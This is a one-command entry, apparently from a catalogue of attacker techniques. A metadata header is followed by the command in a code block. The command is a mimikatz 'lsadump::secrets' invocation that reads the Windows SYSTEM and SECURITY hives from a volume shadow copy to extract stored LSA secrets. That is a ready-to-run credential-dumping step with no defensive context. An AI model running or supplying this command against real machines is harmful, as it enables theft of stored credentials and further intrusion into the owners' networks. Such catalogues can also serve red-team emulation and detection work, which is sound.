---
id: 61c4d208-c0c2-4480-9dce-a9f30a2382dd
name: Extract secrets from SECURITY
type: command
executor: bash
data: mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
  /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
output: null
created_at: '2023-04-06T03:56:28.851674+00:00'
updated_at: '2023-04-10T20:37:52.895105+00:00'
---

# Extract secrets from SECURITY

```bash
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```


